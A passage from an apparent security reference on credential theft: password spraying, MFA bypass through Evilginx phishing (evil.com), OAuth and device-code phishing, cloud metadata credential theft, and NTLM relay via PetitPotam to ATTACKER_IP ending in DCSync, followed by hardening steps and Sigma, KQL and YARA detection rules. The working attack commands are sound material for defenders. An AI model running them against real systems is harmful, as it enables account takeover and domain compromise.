### 9.1 Techniques and Tools

Password spraying tries a small number of passwords against many accounts, staying below lockout thresholds. Reverse of brute force (many passwords against one account).

```
# kerbrute — Kerberos-based (no lockout events for pre-auth failures on some configs)
kerbrute passwordspray -d domain.local --dc 10.0.0.1 users.txt 'Winter2024!'
kerbrute bruteuser -d domain.local --dc 10.0.0.1 passwords.txt admin

# DomainPasswordSpray (PowerShell — domain-joined)
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password 'Winter2024!' -OutFile sprayed.txt
Invoke-DomainPasswordSpray -Password 'Winter2024!' -Force  # skip lockout check

# Impacket
python3 spraying.py domain.local/users.txt passwords.txt -dc-ip 10.0.0.1

# Netexec (multi-protocol)
nxc smb 10.0.0.0/24 -u users.txt -p 'Winter2024!' --no-bruteforce
nxc smb 10.0.0.0/24 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

# Ruler (Exchange/OWA)
ruler -domain domain.local brute --users users.txt --passwords passwords.txt

# SprayingToolkit (OWA/O365)
python3 atomizer.py owa mail.domain.local 'Winter2024!' users.txt
```

### 9.2 Lockout Avoidance

```
# Check domain lockout policy before spraying
net accounts /domain
# Or PowerShell
Get-ADDefaultDomainPasswordPolicy

# Key values:
# Lockout threshold (e.g., 5 bad attempts)
# Lockout observation window (e.g., 30 min)
# Lockout duration (e.g., 30 min)

# Strategy: spray 1 password, wait the full observation window, spray next
# Kerbrute pre-auth failures may not increment the lockout counter
# depending on domain configuration
```

### 9.3 Detection

```yaml
title: Password Spraying — Multiple Failed Logons from Single Source
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID:
      - 4625
      - 4771
  condition: selection | count(TargetUserName) by IpAddress > 10 within 10m
level: high
```

KQL:
```kql
SecurityEvent
| where EventID == 4625
| summarize FailedAccounts = dcount(TargetUserName),
    AccountList = make_set(TargetUserName, 20)
    by IpAddress, bin(TimeGenerated, 10m)
| where FailedAccounts > 5
```

**Hardening:** Smart lockout (Azure AD), fine-grained password policies, ban common passwords, monitor for pre-auth failure spikes.

---

## 10. MFA Bypass Techniques

### 10.1 Real-Time Phishing (AiTM — Adversary in the Middle)

The attacker proxies the entire authentication flow in real time, capturing both the password and the session cookie/token after MFA completion.

```
# Evilginx2 — phishing framework with session capture
evilginx2
: phishlets hostname o365 evil.com
: phishlets enable o365
: lures create o365
: lures get-url 0
# Victim visits phishing URL → authenticates via real Microsoft login
# → Evilginx captures session cookie + credentials

# Modlishka — similar real-time proxy
modlishka -config modlishka.json
# Proxies target.com through attacker domain, captures tokens

# Muraena + NecroBrowser — automated session hijacking
```

**Result:** Attacker obtains a fully-authenticated session cookie that bypasses MFA. Works against TOTP, push notification, SMS MFA. Only phishing-resistant MFA (FIDO2/WebAuthn) is immune — WebAuthn binds the authentication to the origin, so the proxy domain fails origin validation.

### 10.2 MFA Fatigue / Push Bombing

The attacker has valid credentials (from phishing, spraying, or breach data) and repeatedly triggers MFA push notifications until the victim approves one out of frustration or confusion.

**Mitigation:** Number matching (Microsoft Authenticator, Okta), additional context (location, app), rate limiting push notifications, switching to FIDO2.

### 10.3 SIM Swapping

Attacker social-engineers the victim's mobile carrier into transferring the victim's phone number to an attacker-controlled SIM. SMS-based MFA codes then go to the attacker. Primarily targets SMS OTP — does not affect TOTP apps or hardware keys.

### 10.4 Token Theft Post-Authentication

Even with MFA, session tokens and refresh tokens stored in the browser or on disk can be stolen:

```
# Browser cookie theft (session hijack after MFA)
SharpChromium.exe cookies
# Extract Azure AD / O365 session cookies → import into attacker browser

# PRT theft (Azure AD SSO token — see §11.2)
mimikatz # token::elevate
mimikatz # sekurlsa::cloudap   # extract PRT and session key

# OAuth refresh token theft from token cache
# Azure: %LOCALAPPDATA%\.IdentityService\msal.cache
# AWS: ~/.aws/cli/cache/*.json
```

**Detection:** Impossible travel alerts (token used from geographically distant locations), device fingerprint mismatch, CAE (Continuous Access Evaluation) for near-real-time token revocation.

---

## 11. SAML and OAuth Token Abuse

### 11.1 Golden SAML

Exploits the IdP's token-signing certificate. An attacker who obtains the AD FS signing certificate can forge SAML assertions for any user to any relying party.

```
# ADFSDump — extract AD FS signing certificate
ADFSDump.exe

# Extract from AD FS config database
# WID: C:\Windows\WID\Data\AdfsConfiguration.mdf
# SQL: connect to AD FS database

# Extract DKM key from AD (needed to decrypt the cert)
mimikatz # lsadump::dcsync /user:ADFS_SERVICE_ACCOUNT
# Or query the DKM container in AD:
# CN=ADFS,CN=Microsoft,CN=Program Data,DC=domain,DC=local

# Forge SAML assertion
# Use ADFSpoof or custom tooling with the extracted signing cert
python3 ADFSpoof.py -b adfs_config.bin dkm_key -s assertion.xml
```

The SUNBURST/SolarWinds attack (UNC2452/APT29) used this technique for persistent M365 access.

**Detection:** SAML assertions without corresponding IdP authentication logs, assertions with anomalous attributes/groups, assertions from unexpected IPs. Azure AD logs: Sign-in events with `authenticationProtocol: samlp` without a matching AD FS authentication event.

### 11.2 Primary Refresh Token (PRT) Theft

The PRT is stored in LSASS (`CloudAP` SSP) on Azure AD joined/hybrid-joined devices. Protected by TPM-backed session key on modern hardware.

```
# Mimikatz — extract PRT and derived key (non-TPM systems)
mimikatz # privilege::debug
mimikatz # sekurlsa::cloudap
# Output: PRT, ProofOfPossessionKey (session key)

# ROADtoken — extract PRT
ROADtoken.exe

# AADInternals — use extracted PRT
Get-AADIntAccessTokenForMSGraph -PRTToken <prt> -DerivedKey <key>

# RequestAADRefreshToken — use stolen PRT for token exchange
python3 roadtools_auth.py --prt <prt> --prt-sessionkey <key> \
  --resource https://graph.microsoft.com
```

**Detection:**

KQL (Azure AD sign-in logs):
```kql
SigninLogs
| where AuthenticationDetails contains "primaryRefreshToken"
| where IPAddress != "expected_corporate_ip"
| project TimeGenerated, UserPrincipalName, IPAddress, DeviceDetail, Location
```

### 11.3 OAuth Consent Grant Attack

```
# Step 1: Register malicious app in attacker's Azure AD tenant
# Configure: redirect_uri = https://attacker.com/callback
# Request permissions: Mail.Read, Files.ReadWrite.All, User.Read.All

# Step 2: Craft consent URL
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
  client_id=<attacker_app_id>&
  response_type=code&
  redirect_uri=https://attacker.com/callback&
  scope=https://graph.microsoft.com/.default&
  response_mode=query&
  prompt=consent

# Step 3: Send URL to victim admin via phishing
# Victim grants consent → attacker gets OAuth tokens

# Step 4: Use tokens for persistent access
# Access victim's mail:
GET https://graph.microsoft.com/v1.0/me/messages
Authorization: Bearer <access_token>

# Access files:
GET https://graph.microsoft.com/v1.0/me/drive/root/children
Authorization: Bearer <access_token>
```

**Detection:**
```kql
AuditLogs
| where OperationName == "Consent to application"
| extend AppId = tostring(TargetResources[0].id)
| extend ConsentedPermissions = tostring(TargetResources[0].modifiedProperties)
| where ConsentedPermissions contains "Mail.Read" or
    ConsentedPermissions contains "Files.ReadWrite"
| project TimeGenerated, InitiatedBy, AppId, ConsentedPermissions
```

**Hardening:** Disable user consent (require admin approval): Azure AD → Enterprise Applications → Consent and Permissions → "Do not allow user consent". Create an admin consent workflow.

### 11.4 Device Code Phishing

```
# Step 1: Initiate device code flow
POST https://login.microsoftonline.com/common/oauth2/v2.0/devicecode
Content-Type: application/x-www-form-urlencoded

client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&scope=https://graph.microsoft.com/.default offline_access

# Response: user_code (e.g., "ABCD1234"), device_code, verification_uri

# Step 2: Send user_code to victim via social engineering
# "Please go to https://microsoft.com/devicelogin and enter code ABCD1234"

# Step 3: Victim authenticates + completes MFA

# Step 4: Poll for token
POST https://login.microsoftonline.com/common/oauth2/v2.0/token
Content-Type: application/x-www-form-urlencoded

grant_type=urn:ietf:params:oauth:grant-type:device_code&
device_code=<device_code>&
client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c

# Response: access_token, refresh_token → persistent access
```

**Detection:** Azure AD sign-in logs: `authenticationProtocol: deviceCode`. Alert on Device Code authentications from unexpected applications or locations. Block Device Code flow via Conditional Access.

---

## 12. Cloud Credential Theft

### 12.1 AWS Credential Sources

| Source | Path / Method | Credential Type |
|--------|--------------|-----------------|
| IMDS v1 | `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` | Temporary IAM creds |
| Environment variables | `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN` | IAM keys |
| Config files | `~/.aws/credentials`, `~/.aws/config` | IAM keys |
| CLI cache | `~/.aws/cli/cache/*.json` | Temporary tokens |
| EC2 user data | `http://169.254.169.254/latest/user-data` | Sometimes contains creds |
| Lambda env vars | `env` inside Lambda function | IAM keys, DB creds |
| ECS task metadata | `http://169.254.170.2/v2/credentials/<uuid>` | Temporary IAM creds |
| SSM Parameter Store | `aws ssm get-parameters-by-path --path /` | Application secrets |
| Secrets Manager | `aws secretsmanager list-secrets` | Application secrets |

```
# IMDS v1 credential theft (via SSRF or local access)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# IMDS v2 (requires token — blocks most SSRF)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Pacu (AWS exploitation framework)
pacu> run iam__enum_permissions
pacu> run iam__privesc_scan
```

### 12.2 Azure Credential Sources

```
# Azure IMDS (managed identity)
curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# PRT extraction (see §11.2)
mimikatz # sekurlsa::cloudap

# Azure CLI token cache
cat ~/.azure/msal_token_cache.json
cat ~/.azure/accessTokens.json  # older versions

# Az PowerShell token cache
$token = (Get-AzAccessToken).Token

# Environment variables in App Service / Functions
env | grep -i azure
# IDENTITY_ENDPOINT, IDENTITY_HEADER → managed identity
```

### 12.3 GCP Credential Sources

```
# GCP metadata server
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Service account key files
find / -name "*.json" -exec grep -l "private_key" {} \; 2>/dev/null

# Application default credentials
cat ~/.config/gcloud/application_default_credentials.json

# GCP CLI credentials
cat ~/.config/gcloud/credentials.db
```

**Hardening (all clouds):** Enforce IMDSv2 (AWS), restrict metadata server access from containers, use short-lived credentials, rotate service account keys, monitor for unusual API calls from new IP addresses.

---

## 13. Kerberos Credential Theft on Linux

Linux systems joined to AD (via SSSD, Winbind, or realmd) store Kerberos credentials in ccache files and keytab files.

```
# Ccache files (temporary Kerberos tickets)
ls -la /tmp/krb5cc_*
# Environment variable: KRB5CCNAME points to the active ccache

# Extract and use ccache
export KRB5CCNAME=/tmp/krb5cc_1000
klist  # list tickets in cache
# Use with Impacket for PtT
impacket-psexec domain.local/user@target -k -no-pass

# Keytab files (long-term Kerberos keys)
find / -name "*.keytab" 2>/dev/null
# Common: /etc/krb5.keytab (machine account keytab)

# Extract keys from keytab
klist -k -t /etc/krb5.keytab

# Use keytab for authentication
kinit -k -t /etc/krb5.keytab HOST/server.domain.local
# Now have a TGT — use for lateral movement

# KeytabParser — extract NTLM hash from keytab
python3 keytabparser.py /etc/krb5.keytab
```

**Detection:** Monitor access to `/tmp/krb5cc_*` and `*.keytab` files. Audit `kinit` usage. SSSD logs in `/var/log/sssd/`.

---

## 14. NTLM Relay and Authentication Coercion

### 14.1 NTLM Relay

NTLM does not bind authentication to the destination service. An attacker who intercepts NTLM auth can relay it to a different service.

```
# ntlmrelayx — relay to various targets
impacket-ntlmrelayx -t smb://target -smb2support
impacket-ntlmrelayx -t ldap://dc01 --escalate-user attacker
impacket-ntlmrelayx -t ldap://dc01 --delegate-access  # RBCD
impacket-ntlmrelayx -t http://ca.domain.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController  # ESC8

# Responder — capture NTLM hashes on the wire
responder -I eth0 -wrf
# Captures: LLMNR, NBT-NS, MDNS, WPAD poisoning → NTLM hashes
# Crack captured NTLMv2 hashes:
hashcat -m 5600 ntlmv2_hashes.txt wordlist.txt
```

### 14.2 Authentication Coercion

```
# PetitPotam (MS-EFSRPC)
python3 PetitPotam.py ATTACKER_IP DC01.domain.local
python3 PetitPotam.py -u user -p pass -d domain.local ATTACKER_IP DC01

# PrinterBug / SpoolSample (MS-RPRN)
SpoolSample.exe DC01.domain.local ATTACKER.domain.local
python3 printerbug.py domain.local/user:pass@DC01 ATTACKER_HOST

# DFSCoerce (MS-DFSNM)
python3 DFSCoerce.py -u user -p pass -d domain.local ATTACKER_HOST DC01

# ShadowCoerce (MS-FSRVP)
python3 ShadowCoerce.py -u user -p pass -d domain.local ATTACKER_HOST DC01

# Coercer — unified tool for all coercion methods
coercer coerce -u user -p pass -d domain.local -l ATTACKER_HOST -t DC01
```

**Full relay chain (PetitPotam → ADCS → Domain compromise):**
```
# Terminal 1: Start relay targeting ADCS
impacket-ntlmrelayx -t http://ca.domain.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Terminal 2: Coerce DC
python3 PetitPotam.py ATTACKER_IP DC01.domain.local

# ntlmrelayx captures DC cert → base64 output
# Terminal 3: Authenticate with DC cert
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1
# → Returns DC01$ NTLM hash

# Terminal 4: DCSync
impacket-secretsdump domain.local/DC01\$@dc01.domain.local -hashes :HASH
```

**Hardening:**
```
# Require LDAP signing on DCs
GPO: Computer Configuration → Policies → Windows Settings → Security Settings →
  Local Policies → Security Options →
  "Domain controller: LDAP server signing requirements" → Require signing

# Enable LDAP channel binding
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" \
  /v LdapEnforceChannelBinding /t REG_DWORD /d 2 /f

# Require SMB signing
GPO: "Microsoft network server: Digitally sign communications (always)" → Enabled

# Disable Print Spooler on DCs
Stop-Service Spooler; Set-Service Spooler -StartupType Disabled

# Enable EPA on ADCS web enrollment
# IIS → Windows Authentication → Advanced Settings → Extended Protection: Require

# Restrict NTLM
GPO: "Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers" → Deny all
```

---

## 15. Post-Exploitation Credential Hygiene and Incident Response

### 15.1 Credential Rotation Priority Order

When credential theft is confirmed, rotate in this order:

| Priority | What to Rotate | Why | How |
|----------|---------------|-----|-----|
| 1 | krbtgt password (twice, 12h apart) | Invalidates all Golden Tickets | `Reset-KrbtgtKeyInteractive` or manual reset |
| 2 | Compromised account passwords | Direct access | Force password reset |
| 3 | Service account passwords / gMSA | Kerberoasted accounts | Reset + verify service functionality |
| 4 | Computer account passwords | Silver Ticket material | `Reset-ComputerMachinePassword` |
| 5 | AD FS signing certificate | Golden SAML | Rotate cert, update all RPs |
| 6 | Azure AD Connect account (MSOL_) | Sync compromise | Rotate + audit sync scope |
| 7 | DPAPI domain backup key | DPAPI data decryption | Cannot be easily rotated — re-evaluate risk |
| 8 | LAPS passwords | Local admin compromise | Force LAPS password rotation |
| 9 | Trust keys (inter-domain) | Cross-domain persistence | Reset trust, re-establish |
| 10 | Cloud tokens (PRT, OAuth) | Cloud persistence | Revoke all sessions, invalidate refresh tokens |

### 15.2 Blast Radius Assessment

```
# Identify what the attacker could have accessed
# 1. Check for DCSync (full domain compromise)
Get-ADUser -Filter * | Measure-Object  # All accounts exposed

# 2. Check for NTDS.DIT extraction
# Same as DCSync — all domain credentials

# 3. Check for LSASS dump on specific hosts
# Only users logged into those hosts are exposed
# Query: who was logged in at the time?
Get-EventLog -LogName Security -InstanceId 4624 -After "2024-01-01" |
  Where-Object { $_.Message -match "Logon Type:\s+(2|10|11)" }

# 4. Check for lateral movement from compromised credentials
# Correlate 4624 events with compromised account names
```

### 15.3 Comprehensive Hardening Checklist

```
# Credential theft prevention stack:
# 1. Credential Guard (LSASS isolation)
# 2. RunAsPPL with UEFI lock (LSASS PPL)
# 3. Disable WDigest
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" \
  /v UseLogonCredential /t REG_DWORD /d 0 /f
# 4. Protected Users group (disable NTLM, WDigest, CredSSP for members)
Add-ADGroupMember -Identity "Protected Users" -Members admin_accounts
# 5. Authentication Policies and Silos (restrict where privileged accounts can authenticate)
New-ADAuthenticationPolicy -Name "T0-Policy" -UserTGTLifetimeMins 60
# 6. LAPS (unique local admin passwords)
# 7. Disable cached logons where feasible
# 8. Tiered administration (T0/T1/T2)
# 9. Defender ASR rule for credential stealing
Set-MpPreference -AttackSurfaceReductionRules_Ids 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2 \
  -AttackSurfaceReductionRules_Actions Enabled
# 10. FIDO2/WebAuthn for phishing-resistant MFA
```

---

## 16. Comprehensive Detection Architecture

### 16.1 LSASS Detection Stack

- Sysmon Event ID 10 (ProcessAccess to lsass.exe) with `GrantedAccess` baselining
- Sysmon Event ID 7 (Image loaded into lsass.exe) for SSP injection
- Security Event ID 4622 (SSP registration)
- Sysmon Event ID 1 (Process creation for known dump tools)
- Defender ASR rule `9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2`
- ETW `Microsoft-Windows-Threat-Intelligence` for kernel-level LSASS access

### 16.2 Authentication Monitoring

- Event ID 4768 (TGT request) — AS-REP Roasting (PreAuthType: 0)
- Event ID 4769 (TGS request) — Kerberoasting (EncryptionType: 0x17, volume)
- Event ID 4662 (DS object access) — DCSync (replication GUIDs from non-DC)
- Event ID 5136 (DS attribute change) — RBCD, delegation, ACL modifications
- Event ID 4625 (failed logon) — password spraying (volume per source IP)
- Event ID 4624 Type 9 (NewCredentials) — pass-the-hash, token impersonation

### 16.3 Network-Layer Detection

- MS-DRSR traffic from non-DC sources (DCSync)
- NTLM auth from DCs to non-DC destinations (relay/coercion)
- SMB traffic to attacker IPs (coerced authentication)
- S4U2Proxy requests from unexpected sources (delegation abuse)

KQL (consolidated credential attack detection):
```kql
let DCSync = SecurityEvent | where EventID == 4662
  | where Properties contains "1131f6ad"
  | where SubjectUserName !endswith "$";
let Kerberoast = SecurityEvent | where EventID == 4769
  | where TicketEncryptionType == "0x17" | where ServiceName !endswith "$"
  | summarize SPNCount = dcount(ServiceName) by IpAddress, bin(TimeGenerated, 5m)
  | where SPNCount > 3;
let LsassAccess = SecurityEvent | where EventID == 10
  | where TargetImage endswith "\\lsass.exe"
  | where GrantedAccess in ("0x1FFFFF","0x1010");
let Spraying = SecurityEvent | where EventID == 4625
  | summarize FailCount = dcount(TargetUserName) by IpAddress, bin(TimeGenerated, 10m)
  | where FailCount > 10;
union DCSync, Kerberoast, LsassAccess, Spraying
| project TimeGenerated, EventType = "CredentialAttack", Details = pack_all()
```

---

## 17. Credential Theft Detection Engineering

Section 16 provided a summary detection architecture. This section delivers production-grade detection rules — full Sigma rules with complete metadata, YARA signatures for forensic artifact hunting, Windows Event Log correlation matrices, and EDR telemetry guidance that can be deployed directly into a SOC pipeline.

### 17.1 Sigma Rules

#### 17.1.1 LSASS Access with Suspicious Call Trace

```yaml
title: LSASS Access via NtReadVirtualMemory from Suspicious Process
id: 7c3b4f2a-d8e1-4a9b-b7c3-1f2e3d4a5b6c
status: stable
description: >
  Detects processes opening a handle to lsass.exe with memory read access
  (0x1010 or 0x1FFFFF) where the call trace includes NtReadVirtualMemory,
  indicating credential dumping activity. Filters legitimate security
  products by image path.
author: SOC Detection Engineering
date: 2025/03/15
references:
  - https://attack.mitre.org/techniques/T1003/001/
  - https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon
tags:
  - attack.credential_access
  - attack.t1003.001
logsource:
  category: process_access
  product: windows
detection:
  selection:
    EventID: 10
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess:
      - '0x1010'
      - '0x1FFFFF'
      - '0x1410'
      - '0x143A'
      - '0x1438'
    CallTrace|contains:
      - 'ntdll.dll+' 
      - 'NtReadVirtualMemory'
      - 'UNKNOWN'
  filter_legitimate:
    SourceImage|startswith:
      - 'C:\Program Files\Windows Defender\'
      - 'C:\Program Files\Microsoft Security Client\'
      - 'C:\ProgramData\Microsoft\Windows Defender\'
      - 'C:\Program Files\CrowdStrike\'
      - 'C:\Program Files (x86)\Symantec\'
  filter_csrss:
    SourceImage|endswith: '\csrss.exe'
  condition: selection and not filter_legitimate and not filter_csrss
falsepositives:
  - Legitimate security products not in the filter list
  - Windows Error Reporting creating minidumps under specific conditions
level: critical
```

#### 17.1.2 DCSync Replication from Non-Domain Controller

```yaml
title: DCSync — Directory Replication from Non-DC Source
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: stable
description: >
  Detects DRSGetNCChanges replication requests (Event ID 4662) targeting
  DS-Replication-Get-Changes-All (GUID 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
  from a source that is not a domain controller machine account. This is the
  primary indicator of a DCSync attack.
author: SOC Detection Engineering
date: 2025/03/15
references:
  - https://attack.mitre.org/techniques/T1003/006/
  - https://adsecurity.org/?p=1729
tags:
  - attack.credential_access
  - attack.t1003.006
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4662
    Properties|contains:
      - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
      - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
      - '89e95b76-444d-4c62-991a-0facbeda640c'
  filter_machine_accounts:
    SubjectUserName|endswith: '$'
  filter_dc_objects:
    SubjectUserName|startswith:
      - 'MSOL_'
  condition: selection and not filter_machine_accounts and not filter_dc_objects
falsepositives:
  - Azure AD Connect (MSOL_ accounts) — filter by exact service account name in production
  - Third-party directory sync tools with replication rights
level: critical
```

#### 17.1.3 Kerberoasting — Bulk RC4 TGS Requests

```yaml
title: Kerberoasting — Multiple RC4-Encrypted TGS Requests
id: b2c3d4e5-f6a7-8901-bcde-f12345678901
status: stable
description: >
  Detects multiple TGS requests (Event ID 4769) with RC4 encryption
  (TicketEncryptionType 0x17) for non-machine service accounts within
  a short time window, indicating Kerberoasting activity. Modern
  environments should use AES for Kerberos; RC4 requests are anomalous.
author: SOC Detection Engineering
date: 2025/03/15
references:
  - https://attack.mitre.org/techniques/T1558/003/
  - https://www.semperis.com/blog/kerberoasting-attack/
tags:
  - attack.credential_access
  - attack.t1558.003
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'
    Status: '0x0'
  filter_machine:
    ServiceName|endswith: '$'
  filter_krbtgt:
    ServiceName: 'krbtgt'
  timeframe: 5m
  condition: selection and not filter_machine and not filter_krbtgt | count(ServiceName) by IpAddress > 3
falsepositives:
  - Legacy applications that genuinely require RC4 (should be documented and baselined)
  - Service accounts configured without AES key support
level: high
```

#### 17.1.4 AS-REP Roasting

```yaml
title: AS-REP Roasting — Pre-Authentication Disabled TGT Request
id: c3d4e5f6-a7b8-9012-cdef-123456789012
status: stable
description: >
  Detects Kerberos authentication requests (Event ID 4768) where
  pre-authentication is not required (PreAuthType: 0), targeting accounts
  with DONT_REQUIRE_PREAUTH set. Bulk requests from a single source
  indicate AS-REP Roasting enumeration.
author: SOC Detection Engineering
date: 2025/03/15
references:
  - https://attack.mitre.org/techniques/T1558/004/
  - https://harmj0y.medium.com/roasting-as-reps-e6179a65216b
tags:
  - attack.credential_access
  - attack.t1558.004
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4768
    PreAuthType: '0'
    Status: '0x0'
  filter_machine:
    TargetUserName|endswith: '$'
  timeframe: 10m
  condition: selection and not filter_machine | count(TargetUserName) by IpAddress > 5
falsepositives:
  - Accounts legitimately configured without pre-authentication (rare — investigate each)
  - Kerberos misconfiguration in legacy environments
level: high
```

#### 17.1.5 NTLM Relay — Unexpected NTLM Authentication to Sensitive Services

```yaml
title: NTLM Relay — NTLM Authentication from Unexpected Source to LDAP/SMB
id: d4e5f6a7-b8c9-0123-def0-234567890123
status: stable
description: >
  Detects NTLM authentication (Event ID 4624, LogonType 3, NtlmV2) where
  the source workstation is a domain controller or server that should
  exclusively use Kerberos. NTLM from a DC to LDAP/SMB indicates coerced
  authentication relayed by an attacker (PetitPotam, PrinterBug, DFSCoerce).
author: SOC Detection Engineering
date: 2025/03/15
references:
  - https://attack.mitre.org/techniques/T1557/001/
  - https://www.thehacker.recipes/ad/movement/ntlm/relay
tags:
  - attack.credential_access
  - attack.t1557.001
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: 3
    AuthenticationPackageName: 'NTLM'
    LmPackageName: 'NTLM V2'
  filter_expected:
    WorkstationName|endswith: '$'
    IpAddress|startswith:
      - '127.'
      - '::1'
  suspicious_source:
    WorkstationName:
      - 'DC01'
      - 'DC02'
  condition: selection and suspicious_source and not filter_expected
falsepositives:
  - Legacy applications on DCs that use NTLM (must be baselined and documented)
  - Misconfigured Kerberos delegation falling back to NTLM
level: critical
```

> **Deployment note:** Replace `DC01`/`DC02` with environment-specific DC hostnames or maintain a dynamic lookup list. In Sentinel, use a watchlist for DC names.

#### 17.1.6 Credential Dumping via Volume Shadow Copy

```yaml
title: Credential Dumping via Volume Shadow Copy Service
id: e5f6a7b8-c9d0-1234-ef01-345678901234
status: stable
description: >
  Detects usage of vssadmin, wmic, or diskshadow to create or access
  Volume Shadow Copies, commonly used to extract ntds.dit, SAM, SYSTEM,
  and SECURITY hives for offline credential extraction.
author: SOC Detection Engineering
date: 2025/03/15
references:
  - https://attack.mitre.org/techniques/T1003/003/
  - https://attack.mitre.org/techniques/T1006/
tags:
  - attack.credential_access
  - attack.t1003.003
logsource:
  category: process_creation
  product: windows
detection:
  selection_vssadmin:
    Image|endswith: '\vssadmin.exe'
    CommandLine|contains:
      - 'create shadow'
      - 'list shadows'
  selection_wmic:
    Image|endswith: '\wmic.exe'
    CommandLine|contains: 'shadowcopy'
  selection_diskshadow:
    Image|endswith: '\diskshadow.exe'
  selection_copy:
    CommandLine|contains:
      - '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy'
      - 'ntds.dit'
      - 'SYSTEM'
      - 'SAM'
  condition: selection_vssadmin or selection_wmic or selection_diskshadow or selection_copy
falsepositives:
  - Legitimate backup solutions using VSS (Windows Server Backup, Veeam)
  - System administrators creating manual shadow copies for maintenance
level: high
```

#### 17.1.7 Suspicious DPAPI Masterkey Access

```yaml
title: Suspicious DPAPI Master Key Access by Non-Owner Process
id: f6a7b8c9-d0e1-2345-f012-456789012345
status: stable
description: >
  Detects access to DPAPI master key files under user Protect directories
  by processes other than lsass.exe and the owning user's session processes.
  Indicates credential harvesting tools like SharpDPAPI or Mimikatz DPAPI module.
author: SOC Detection Engineering
date: 2025/03/15
references:
  - https://attack.mitre.org/techniques/T1555/004/
  - https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107
tags:
  - attack.credential_access
  - attack.t1555.004
logsource:
  category: file_access
  product: windows
detection:
  selection:
    TargetFilename|contains: '\Microsoft\Protect\'
  selection_events:
    EventID:
      - 4663
      - 11
  filter_lsass:
    Image|endswith: '\lsass.exe'
  filter_svchost:
    Image|endswith: '\svchost.exe'
  condition: (selection or selection_events) and not filter_lsass and not filter_svchost
falsepositives:
  - Password management software accessing DPAPI-protected credentials
  - Enterprise credential management tools
level: high
```

#### 17.1.8 Pass-the-Hash — NTLM Type 3 Without Preceding Type 1/2

```yaml
title: Pass-the-Hash — Network Logon with NTLM Hash without Interactive Session
id: a7b8c9d0-e1f2-3456-0123-567890123456
status: stable
description: >
  Detects NTLM network logon (Type 3, Event ID 4624) where the source
  account has no preceding interactive logon (Type 2/10) on the source
  workstation within a lookback window. This pattern indicates pass-the-hash
  where the attacker uses an NT hash directly without knowing the password.
  Requires correlation between 4624 Type 3 and 4624 Type 2/10 events.
author: SOC Detection Engineering
date: 2025/03/15
references:
  - https://attack.mitre.org/techniques/T1550/002/
  - https://jpcertcc.github.io/ToolAnalysisResultSheet/
tags:
  - attack.lateral_movement
  - attack.t1550.002
logsource:
  product: windows
  service: security
detection:
  selection_logon:
    EventID: 4624
    LogonType: 3
    AuthenticationPackageName: 'NTLM'
  filter_machine:
    TargetUserName|endswith: '$'
  filter_anonymous:
    TargetUserName: 'ANONYMOUS LOGON'
  condition: selection_logon and not filter_machine and not filter_anonymous
falsepositives:
  - Service accounts authenticating via NTLM across the network
  - Scheduled tasks using stored credentials
  - Applications using NTLM for service-to-service authentication
level: medium
```

> **Correlation note:** This rule alone produces volume. In a SIEM, enrich with a correlation query: flag Type 3 NTLM logons where `TargetUserName` has no Type 2 or Type 10 logon from `WorkstationName` in the preceding 24 hours. This reduces false positives by an order of magnitude.

### 17.2 YARA Rules

#### 17.2.1 Mimikatz Binary Signatures

```yara
rule Mimikatz_Binary_Signatures
{
    meta:
        description = "Detects Mimikatz binary by characteristic strings, PE section names, and export signatures"
        author = "SOC Detection Engineering"
        date = "2025-03-15"
        reference = "https://github.com/gentilkiwi/mimikatz"
        threat_name = "HackTool.Mimikatz"
        severity = "critical"
        tlp = "white"

    strings:
        // Core string signatures
        $s1 = "mimikatz" ascii wide nocase
        $s2 = "gentilkiwi" ascii wide
        $s3 = "Benjamin DELPY" ascii wide
        $s4 = "sekurlsa::" ascii wide
        $s5 = "kerberos::" ascii wide
        $s6 = "lsadump::" ascii wide
        $s7 = "dpapi::" ascii wide
        $s8 = "privilege::debug" ascii wide
        $s9 = "token::elevate" ascii wide
        $s10 = "mimilib" ascii wide
        $s11 = "mimidrv" ascii wide

        // Internal function/structure names
        $f1 = "kuhl_m_sekurlsa" ascii
        $f2 = "kuhl_m_lsadump" ascii
        $f3 = "KIWI_MSV1_0_LIST" ascii
        $f4 = "KIWI_BCRYPT_HANDLE_KEY" ascii
        $f5 = "kuhl_m_dpapi" ascii

